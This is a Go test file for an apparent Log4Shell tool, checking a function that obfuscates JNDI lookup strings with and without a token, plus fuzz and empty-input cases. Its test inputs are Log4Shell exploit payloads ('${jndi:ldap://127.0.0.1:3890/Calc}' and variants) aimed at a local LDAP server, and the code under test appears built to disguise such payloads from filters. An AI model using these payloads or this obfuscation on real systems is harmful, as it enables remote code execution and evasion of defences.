package log4shell

import (
	"fmt"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestObfuscate(t *testing.T) {
	t.Run("common", func(t *testing.T) {
		for _, testdata := range [...]string{
			"${jndi:ldap://127.0.0.1:3890/Calc}",
			"${jndi:ldap://127.0.0.1:3890/Notepad}",
			"${jndi:ldap://127.0.0.1:3890/Nop}",
			"test",
		} {
			t.Run("with token", func(t *testing.T) {
				obfuscated, rwt := Obfuscate(testdata, true)
				fmt.Println(testdata)
				fmt.Println(rwt)
				fmt.Println(obfuscated)
				fmt.Println()
			})

			t.Run("without token", func(t *testing.T) {
				obfuscated, rwt := Obfuscate(testdata, false)
				fmt.Println(testdata)
				require.Zero(t, rwt)
				fmt.Println(obfuscated)
				fmt.Println()
			})
		}
	})

	t.Run("empty raw string", func(t *testing.T) {
		t.Run("with token", func(t *testing.T) {
			obfuscated, rwt := Obfuscate("", true)
			require.Zero(t, rwt)
			require.Zero(t, obfuscated)
		})

		t.Run("without token", func(t *testing.T) {
			obfuscated, rwt := Obfuscate("", false)
			require.Zero(t, rwt)
			require.Zero(t, obfuscated)
		})
	})

	t.Run("fuzz", func(t *testing.T) {
		t.Run("with token", func(t *testing.T) {
			for i := 0; i < 100000; i++ {
				raw := "${" + randString(64) + "}"
				obfuscated, rwt := Obfuscate(raw, true)
				require.NotZero(t, rwt)
				require.NotZero(t, obfuscated)
			}
		})

		t.Run("without token", func(t *testing.T) {
			for i := 0; i < 100000; i++ {
				raw := "${" + randString(64) + "}"
				obfuscated, rwt := Obfuscate(raw, false)
				require.Zero(t, rwt)
				require.NotZero(t, obfuscated)
			}
		})
	})
}
